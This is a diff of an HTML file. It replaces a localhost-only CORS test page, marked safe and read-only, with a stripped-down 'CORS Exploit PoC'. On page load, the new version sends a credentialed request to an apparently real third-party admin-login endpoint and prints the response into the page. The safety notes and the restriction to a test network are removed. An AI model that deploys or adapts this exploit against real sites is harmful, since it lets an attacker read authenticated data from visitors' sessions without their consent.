@@ -1,50 +1,18 @@
-<!doctype html>
 <html>
-<head>
-  <meta charset="utf-8" />
-  <title>Flow CORS PoC (Safe)</title>
-</head>
 <body>
-  <h2>Flow CORS PoC — Safe (read-only)</h2>
-  <p>Note: Run only on emulator/testnet and on accounts you control.</p>
-  <label>Base URL: <input id="base" value="http://localhost:8080"></label><br>
-  <label>Account: <input id="acct" value="0xf8d6e0586b0a20c7"></label><br>
-  <label>Endpoint: 
-    <select id="endpoint">
-      <option value="/v1/accounts/{acct}/keys">/v1/accounts/{acct}/keys</option>
-      <option value="/v1/accounts/{acct}">/v1/accounts/{acct}</option>
-      <option value="/v1/blocks?start_height=1&end_height=3">/v1/blocks?start_height=1&end_height=3</option>
-      <option value="/v1/events?type=A.0f8d6e0586b0a20c7.FlowToken.TokensDeposited&start_height=1&end_height=3">/v1/events?... </option>
-    </select>
-  </label><br>
-  <button id="run">Run PoC (fetch)</button>
-  <pre id="out" style="white-space:pre-wrap; border:1px solid #ccc; padding:8px; max-height:400px; overflow:auto;"></pre>
-
-<script>
-document.getElementById('run').onclick = async function(){
-  const base = document.getElementById('base').value.trim();
-  const acct = document.getElementById('acct').value.trim();
-  let ep = document.getElementById('endpoint').value;
-  ep = ep.replace('{acct}', acct);
-  const url = base.replace(/\/$/, '') + ep;
-  const out = document.getElementById('out');
-  out.textContent = "[*] Requesting: " + url + "\n\n";
-
-  try {
-    const resp = await fetch(url, {
+  <h2>CORS Exploit PoC</h2>
+  <script>
+    fetch("https://go.capital.com/v2/login/admin-login/", {
       method: "GET",
-      credentials: "include", // demonstrates credentialed request — run only in test env
-      headers: { "Accept": "application/json" }
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      document.body.innerHTML += "<pre>" + data + "</pre>";
+    })
+    .catch(e => {
+      document.body.innerHTML += "<b>Exploit failed:</b> " + e;
     });
-    // print status + selected CORS headers if available (browser limits header access in some cases)
-    out.textContent += `Status: ${resp.status} ${resp.statusText}\n\n`;
-    // attempt to read JSON (read-only)
-    let text = await resp.text();
-    out.textContent += "Body (truncated):\n" + text.substring(0, 2000) + (text.length>2000 ? "\n... (truncated)" : "") + "\n\n";
-  } catch (err) {
-    out.textContent += "Error: " + err + "\n";
-  }
-};
-</script>
+  </script>
 </body>
 </html>
